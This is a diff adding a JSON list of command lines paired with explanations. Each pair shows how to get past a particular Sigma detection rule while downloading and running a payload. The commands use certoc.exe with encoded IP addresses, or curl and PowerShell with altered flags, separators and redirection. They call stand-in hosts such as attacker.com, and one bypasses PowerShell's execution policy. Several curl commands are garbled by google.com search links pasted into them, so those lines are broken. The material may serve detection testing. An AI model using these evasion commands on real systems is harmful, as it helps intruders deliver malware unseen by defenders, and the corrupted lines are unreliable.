@@ -1,0 +1,50 @@
+[
+  {
+    "output": "certoc.exe /GetCACAPS http://192.168.1.100/payload.dll",
+    "explanation": "The Sigma rule explicitly checks for the string '-GetCACAPS' in the 'selection_cli' condition. Since Windows utilities typically accept both hyphens and forward slashes for command line switches, substituting it with '/GetCACAPS' successfully bypasses this exact string match."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS http://3232235876/payload.dll",
+    "explanation": "The 'selection_ip' regex strictly looks for the standard dotted-decimal IPv4 format (e.g., X.X.X.X). By converting the target IP address (192.168.1.100) to its Decimal/Integer representation (3232235876), the underlying Windows network APIs will still resolve and connect to it, but the SIEM's regular expression will fail to match."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS http://0xC0A80164/payload.dll",
+    "explanation": "Similar to the decimal encoding technique, converting the IPv4 address into its Hexadecimal equivalent (0xC0A80164) completely evades the regex expecting numbers separated by periods, while the tool still successfully downloads the file."
+  },
+  {
+    "output": "certoc.exe -GetCACAPS http://[::ffff:192.168.1.100]/payload.dll",
+    "explanation": "By using an IPv4-mapped IPv6 address format, the URL syntax fundamentally changes. The regex defined in 'selection_ip' expects the sequence '://' directly followed by a number, so the presence of the IPv6 brackets and prefix completely breaks the detection."
+  },
+  {
+    "output": "cmd.exe /c curl [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) --output payload.exe & payload.exe",
+    "explanation": "The Sigma rule explicitly expects the '-o' flag to be present in the command line. By replacing the short flag '-o' with its long-form equivalent '--output', the strict string matching fails, bypassing the rule while achieving the same functional result."
+  },
+  {
+    "output": "cmd.exe /c curl.exe [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) -o payload.exe & payload.exe",
+    "explanation": "The rule looks for the exact string 'curl ' (with a trailing space). By specifying the full executable name 'curl.exe', the command line contains 'curl.exe ' instead. Since 'curl ' is not present, the 'contains|all' condition fails."
+  },
+  {
+    "output": "powershell.exe -c \"curl [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) -o payload.exe ; .\\payload.exe\"",
+    "explanation": "The rule mandates the presence of the '&' character, which is commonly used in cmd.exe to chain the download and execution commands. By executing the chain in PowerShell and using a semicolon (';') as the command separator instead of '&', the rule is bypassed."
+  },
+  {
+    "output": "cmd.exe /c curl [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) > payload.exe & payload.exe",
+    "explanation": "Instead of using curl's built-in output parameters (-o or --output), this command uses standard output redirection ('>') to save the downloaded payload to disk. This circumvents the '-o' string requirement in the rule's selection."
+  },
+  {
+    "output": "curl -s http://attacker.com/payload.ps1 --output C:\\Users\\Public\\p.ps1 ; powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\p.ps1",
+    "explanation": "The rule specifically looks for the '&' character to identify command chaining. By using a semicolon (';') in PowerShell or Command Prompt, the attacker can execute the second command sequentially without triggering the '&' requirement."
+  },
+  {
+    "output": "curl http://attacker.com/payload.exe -o C:\\Users\\Public\\p.exe\nC:\\Users\\Public\\p.exe",
+    "explanation": "The rule expects all elements (curl, http, -o, and &) to be present in a single command line. By splitting the download and the execution into two separate commands or a script block with a newline, the logic fails to correlate the activity."
+  },
+  {
+    "output": "curl --url http://attacker.com/script.bat --out C:\\Users\\Public\\s.bat && C:\\Users\\Public\\s.bat",
+    "explanation": "The rule is case-sensitive or literal regarding the '-o' flag. Using the long-form alias '--out' or '--output' bypasses the string match for '-o' while performing the exact same function."
+  },
+  {
+    "output": "curl -sL http://attacker.com/payload.exe -O && payload.exe",
+    "explanation": "The rule looks for '-o' (lowercase), which requires a specified filename. Using '-O' (uppercase) tells curl to use the remote filename. This satisfies the download-and-execute behavior but avoids the specific string '-o'."
+  }
+]
